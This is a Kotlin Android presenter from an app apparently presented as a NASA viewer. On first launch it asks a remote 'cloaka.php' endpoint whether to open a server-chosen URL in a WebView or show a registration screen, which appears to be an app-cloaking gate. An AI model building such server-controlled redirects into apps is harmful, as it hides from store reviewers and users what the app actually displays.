package com.example.second_portfolio_proj.presenters

import android.content.SharedPreferences
import android.util.Log
import com.example.second_portfolio_proj.API.RequestPhpService
import com.example.second_portfolio_proj.ScriptPOJO
import com.example.second_portfolio_proj.module.NetworkModule
import com.example.second_portfolio_proj.views.NasaActivityView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import moxy.MvpPresenter
import okhttp3.OkHttpClient
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL


class MainActivityPresenter:MvpPresenter<NasaActivityView> ()
{
    companion object {
        const val IS_NOT_FIRST="is_not_a_first"
        const val REG="reg"
        const val BaseURL="http://platinum-kaz.ru/"
    }

    fun goRetrofit(network: NetworkModule, sp: SharedPreferences) {
        CoroutineScope(Dispatchers.IO).launch { //TODO переделать
            val service = network.getRetrofit(BaseURL).create(
                RequestPhpService::class.java
            )
            val call = service.getScriptInfo()
            call.enqueue(object : Callback<ScriptPOJO> {
                override fun onResponse(call: Call<ScriptPOJO>, response: Response<ScriptPOJO>) {
                    val phpResponse: ScriptPOJO? = response.body()
                    if (phpResponse != null) {
                        //viewState.addInView(phpResponse.asdf + phpResponse.qqqq)
                        //phpResponse.url="https://yandex.ru/"
                        Log.d("key",phpResponse.url.toString())
                        if (phpResponse.url!=null) {
                            sp.edit().putString(IS_NOT_FIRST,phpResponse.url).apply()
                            viewState.goInWebView(phpResponse.url.toString())
                        }
                        else {
                            sp.edit().putString(IS_NOT_FIRST, REG).apply()
                            viewState.goReg()
                        }
                    }
                }
                override fun onFailure(call: Call<ScriptPOJO>, t: Throwable) {
                //TODO обработать неудачный запрос
                }
            })
        }
    }



    fun goNetw2(sp: SharedPreferences) {
        CoroutineScope(Dispatchers.IO).launch {
            val temp=doGet("http://platinum-kaz.ru/cloaka.php?id=2ottk6qvq3n63jec38t8")
            withContext(Dispatchers.Main){
            var answer= temp?.substringAfter("\"url\":\"")
                answer = answer?.substring(0,answer.length - 2)
                Log.i("jopa",answer)
            //answer=null //как будто url нет в скрипте
            if (answer.equals("null") || answer==null) {
                sp.edit().putString(IS_NOT_FIRST, REG).apply()
                viewState.goReg()
            }
            else {
                sp.edit().putString(IS_NOT_FIRST,answer).apply()
                viewState.goInWebView(answer.toString()) //костыль

            }
            }











//            Log.d("jopa",answer)
        }
    }


    fun doGet(url: String?): String? {
        val obj = URL(url)
        val connection: HttpURLConnection = obj.openConnection() as HttpURLConnection

        //add reuqest header
        connection.setRequestMethod("GET")
        connection.setRequestProperty("User-Agent", "Mozilla/5.0")
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5")
        connection.setRequestProperty("Content-Type", "application/json")
        val bufferedReader =
            BufferedReader(InputStreamReader(connection.getInputStream()))
        var inputLine: String?=null
        val response = StringBuffer()
        while (bufferedReader.readLine().also({ inputLine = it }) != null) {
            response.append(inputLine)
        }
        bufferedReader.close()

//      print result
        //Log.d(TAG, "Response string: $response")
        return response.toString()
    }


    fun isFirst (sp:SharedPreferences) :Boolean {
        if (sp.contains(IS_NOT_FIRST)) return false
        return true
    }

    fun redirect(sp:SharedPreferences) {
        val url=sp.getString(IS_NOT_FIRST,"")
        if (url!= REG && url!=null) {
                viewState.goInWebView(url)
        }
        else viewState.goReg()
    }



}